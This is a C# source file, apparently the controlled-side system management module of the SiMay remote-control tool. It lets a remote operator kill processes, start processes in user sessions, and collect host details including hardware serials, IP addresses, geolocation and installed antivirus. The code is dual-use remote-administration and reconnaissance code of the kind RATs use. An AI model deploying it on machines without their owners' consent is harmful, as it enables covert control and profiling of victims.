﻿using Microsoft.VisualBasic.Devices;
using SiMay.Basic;
using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using SiMay.RemoteService.Loader;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Windows.Forms;
using static SiMay.Platform.Windows.CommonWin32Api;

namespace SiMay.Service.Core
{
    [ServiceName("系统管理")]
    [ApplicationName(ApplicationNameConstant.REMOTE_SYSMANAGER)]
    public class SystemService : ApplicationRemoteServiceBase
    {
        private ComputerInfo _memoryInfo = default;
        private PerformanceCounter _cpuInfo = default;
        public override void SessionInited(SessionProviderContext session)
        {
            _memoryInfo = new ComputerInfo();
            _cpuInfo = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        }

        public override void SessionClosed()
        {
            this._cpuInfo.Dispose();
        }

        [PacketHandler(MessageHead.S_SYSTEM_KILL)]
        public void TryKillProcess(SessionProviderContext session)
        {
            var processIds = session.GetMessageEntity<KillPacket>();
            foreach (var id in processIds.ProcessIds)
            {
                try
                {
                    Process.GetProcessById(id).Kill();
                }
                catch { }
            }
        }

        [PacketHandler(MessageHead.S_SYSTEM_MAXIMIZE)]
        public void SetWindowState(SessionProviderContext session)
        {
            var pack = session.GetMessageEntity<SetWindowStatusPacket>();
            int[] handlers = pack.Handlers;
            int state = pack.State;

            if (state == 0)
            {
                for (int i = 0; i < handlers.Length; i++)
                    PostMessage(new IntPtr(handlers[i]), WM_SYSCOMMAND, SC_MINIMIZE, 0);
            }
            else
            {
                for (int i = 0; i < handlers.Length; i++)
                    PostMessage(new IntPtr(handlers[i]), WM_SYSCOMMAND, SC_MAXIMIZE, 0);
            }
        }

        [PacketHandler(MessageHead.S_SYSTEM_ENUMSESSIONS)]
        public SessionsPacket GetSessionItemHandler(SessionProviderContext session)
        {
            var sessions = UserTrunkContext.UserTrunkContextInstance?.GetSessionItems()
                .Select(c => new SiMay.Core.SessionItem()
                {
                    UserName = c.UserName,
                    SessionId = c.SessionId,
                    SessionState = c.SessionState,
                    WindowStationName = c.WindowStationName,
                    HasUserProcess = c.HasUserProcess
                })
                .ToArray();

            if (sessions.IsNull())
                return null;

            return new SessionsPacket()
            {
                Sessions = sessions
            };
        }

        [PacketHandler(MessageHead.S_SYSTEM_CREATE_USER_PROCESS)]
        public void CreateProcessAsUser(SessionProviderContext session)
        {
            var request = session.GetMessageEntity<CreateProcessAsUserPack>();
            UserTrunkContext.UserTrunkContextInstance?.CreateProcessAsUser(request.SessionId, request.DesktopName);
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_PROCESS_LIST)]
        public ProcessListPack HandlerGetSystemProcessList(SessionProviderContext session)
        {
            var processList = Process.GetProcesses()
                .OrderBy(p => p.ProcessName)
                .Select(c => new ProcessItem()
                {
                    ProcessId = c.Id,
                    ProcessName = c.ProcessName,
                    ProcessThreadCount = c.Threads.Count,
                    WindowHandler = (int)c.MainWindowHandle,
                    WindowName = c.MainWindowTitle,
                    ProcessMemorySize = ((int)c.WorkingSet64) / 1024,
                    SessionId = c.SessionId,
                    User = "Not",//WTSAPI32.GetUserNameBySessionId(c.SessionId),
                    FilePath = this.GetProcessFilePath(c)
                }).ToArray();

            return new ProcessListPack()
            {
                ProcessList = processList
            };
        }
        private string GetProcessFilePath(Process process)
        {
            try
            {
                return process.MainModule.FileName;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_SYSTEMINFO)]
        public ProcessPacket GetSystemInfosHandler(SessionProviderContext session)
        {
            GeoLocationHelper.Initialize();

            var infos = new List<SystemInfoItem>();
            infos.Add(new SystemInfoItem()
            {
                ItemName = "主板序列号",
                Value = GetSystemInforHelper.BIOSSerialNumber
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "网卡MAC",
                Value = GetSystemInforHelper.GetMacAddress
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "驱动器存储信息",
                Value = GetSystemInforHelper.GetMyDriveInfo
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "运行目录",
                Value = Application.ExecutablePath
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "系统版本号",
                Value = Environment.Version.ToString()
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "启动毫秒",
                Value = Environment.TickCount.ToString()
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "登录账户",
                Value = Environment.UserName
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "被控服务启动时间",
                Value = AppConfiguration.GetApplicationConfiguration<AppConfiguration>().StartParameter.RunTime.ToString()
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "系统版本",
                Value = GetSystemInforHelper.GetOSFullName
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "系统核心数",
                Value = Environment.ProcessorCount.ToString()
            });

            infos.Add(new SystemInfoItem()
            {
                ItemName = "CPU信息",
                Value = GetSystemInforHelper.GetMyCpuInfo
            });

            infos.Add(new SystemInfoItem()
            {
                ItemName = "系统内存",
                Value = (GetSystemInforHelper.GetMyMemorySize / 1024 / 1024) + "MB"
            });

            infos.Add(new SystemInfoItem()
            {
                ItemName = "计算机名称",
                Value = Environment.MachineName
            });

            infos.Add(new SystemInfoItem()
            {
                ItemName = "被控服务版本",
                Value = AppConfiguration.GetApplicationConfiguration<AppConfiguration>().StartParameter.Version
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "WAN IP",
                Value = GeoLocationHelper.GeoInfo.Ip
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "LAN IP",
                Value = GetSystemInforHelper.GetLocalIPv4()
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "安全软件",
                Value = GetSystemInforHelper.GetAntivirus()
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "国家",
                Value = GeoLocationHelper.GeoInfo.Country
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "ISP",
                Value = GeoLocationHelper.GeoInfo.Isp
            });
            infos.Add(new SystemInfoItem()
            {
                ItemName = "GPU",
                Value = GetSystemInforHelper.GetGpuName()
            });
            var sysInfos = new ProcessPacket();
            sysInfos.SystemInfos = infos.ToArray();

            return sysInfos;
        }

        [PacketHandler(MessageHead.S_SYSTEM_GET_OCCUPY)]
        public SystemOccupyPack handlerGetSystemOccupyRate(SessionProviderContext session)
        {
            string cpuUserate = "-1";
            try
            {
                cpuUserate = ((_cpuInfo.NextValue() / Environment.ProcessorCount)).ToString("0.0") + "%";
            }
            catch { }

            return new SystemOccupyPack()
            {
                CpuUsage = cpuUserate,
                MemoryUsage = (_memoryInfo.TotalPhysicalMemory / 1024 / 1024).ToString() + "MB/" + ((_memoryInfo.TotalPhysicalMemory - _memoryInfo.AvailablePhysicalMemory) / 1024 / 1024).ToString() + "MB"
            };
        }
    }
}